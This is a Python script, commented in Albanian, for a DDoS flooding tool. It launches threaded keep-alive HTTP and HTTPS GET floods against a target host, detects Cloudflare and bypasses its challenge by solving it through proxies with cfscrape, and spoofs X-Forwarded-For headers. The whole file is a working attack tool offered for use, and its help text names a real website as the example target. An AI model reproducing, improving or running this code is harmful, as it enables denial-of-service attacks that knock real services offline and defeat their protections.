import cfscrape, socket, urllib.request, ssl
import _thread, threading, random, argparse
from urllib.request import Request,urlopen
from time import sleep


# Funksioni main()
def main():
    if args.proxy_file != None:
        proxyget()
    global go
    global x
    x = 0
    go = threading.Event()
    if cloudflare():
        print("*** Serveri", args.host, "ka gjeneruar mekanizmin mbrojtës të Cloudflare")
        for i in range(args.threads):
            _thread.start_new_thread(generate_cf_token,(i,)) # Kalkulo CF token
        sleep(5)
        print("*** Sulmi DDOS ka filluar")
        for x in range(args.threads):
            set_request_cf()
            RequestProxyHTTP(x + 1).start()
        go.set()
    else:
        print("*** Serveri", args.host, "nuk ka gjeneruar mekanizem mbrojtës të Cloudflare")
        for x in range(args.threads):
            _thread.start_new_thread(set_request, ())          # Dergo kerkesen, nuk ka nevoje per kalkulime
        sleep(5)
        print("*** Sulmi DDOS ka filluar")
        for x in range(args.threads):
            request = random.choice(request_list)
            if args.ssl:
                RequestDefaultHTTP(x + 1).start()
            else:
                RequestDefaultHTTPS(x + 1).start()
        go.set()



# Funksioni për  komandat e mundeshme për përdorim te aplikacionit
def usage():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', nargs="?", help="Web serveri, p.sh: coinmarketcap.com", required=True)
    parser.add_argument('-d', '--dir', default="", help="Web path, p.sh: admin/index.php (Default: /)")
    parser.add_argument('-s', '--ssl', dest="ssl", action="store_false", help="HTTP/HTTPS")
    parser.add_argument('-p', '--port', default=80,help="Port #, 80 ose 443 (Default 80)", type=int)
    parser.add_argument('-t', '--threads', default=100, help="Numri i fijeve/threads (Default 100)", type=int)
    parser.add_argument('-x', '--proxy_file', help="Tekst fajlli për ruajtjen e proxy-ve (Opcionale)")
    return parser.parse_args()
    

 # Funksioni për formimin e HTTP kërkeses nëse Cloudflare == False
def set_request():
    global request
    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    useragent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\n"
    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request = get_host + useragent + accept + \
              connection + "\r\n"
    request_list.append(request)

# Funksioni për formimin e HTTP kërkeses nëse Cloudflare == True
def set_request_cf():
    global request_cf
    global proxy_ip
    global proxy_port
    cf_combine = random.choice(cf_token).strip().split("#")
    proxy_ip = cf_combine[0]
    proxy_port = cf_combine[1]
    get_host = "GET /" + args.dir + " HTTP/1.1\r\nHost: " + args.host + "\r\n"
    tokens_and_ua = cf_combine[2]
    accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
    randomip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + \
               "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    forward = "X-Forwarded-For: " + randomip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    request_cf = get_host + tokens_and_ua + accept + forward + connection + "\r\n"

# Funksioni që përcakton se a është website i mbrojtur me Cloudflare
def cloudflare():
    cfmessage = False 
    req = urllib.request.Request(url,headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0'})
    response = urllib.request.urlopen(req)
    if "CF-Cache-Status: HIT" in str(response.info()):
        cfmessage = True
    return cfmessage


# Gjenerimi i cookies dhe useragent për cloudflare kalkulime
def generate_cf_token(i):
    proxy= proxy_list[i].strip().split(":") # ['91.93.42.118', '10001'] ruhen ne kete forme
    try:
        proxies = {"http": "http://" + proxy[0] + ":" + proxy[1]}
        scraper = cfscrape.create_scraper()
        cookie_value, user_agent =scraper.get_cookie_string(url, proxies=proxies)
        cookie_value_string = "Cookie: " + cookie_value + "\r\n"
        user_agent_string = "User-Agent: " + user_agent + "\r\n"
        cf_token.append(proxy[0] + "#" + proxy[1] + "#" + cookie_value_string + user_agent_string)
    except:
        pass  

    # Leximi dhe shkrimi i të dhënave nga proxy fajlli ne proxy_list array
def proxyget():
    proxy_file = open(args.proxy_file, "r")
    line = proxy_file.readline().rstrip()
    while line:
        proxy_list.append(line)
        line = proxy_file.readline().rstrip()
    proxy_file.close()


# Klasa DoS në rastin kur serveri nuk është i pajisur me SSL/TLS certifikatë
class RequestDefaultHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s.send(str.encode(request))
                print("Kërkesa është dërguar :", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

# Klasa DDoS në rastin kur serveri është i pajisur me SSL/TLS certifikatë
class RequestDefaultHTTPS(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(args.host), int(args.port)))
                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,
                                    ssl_version=ssl.PROTOCOL_SSLv23)
                s.send(str.encode(request))
                print("Kërkesa është dërguar :", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(request))
                except:
                    s.close()
            except:
                s.close()

# Klasa në rastin kur përdoren serverat ndërmjetësues
class RequestProxyHTTP(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy_ip), int(proxy_port)))
                s.send(str.encode(request_cf))
                print ("Kërkesa është dërguar :", self.counter)
                try:
                    for y in range(50):
                        s.send(str.encode(request_cf))
                except:
                    pass
            except:
                pass
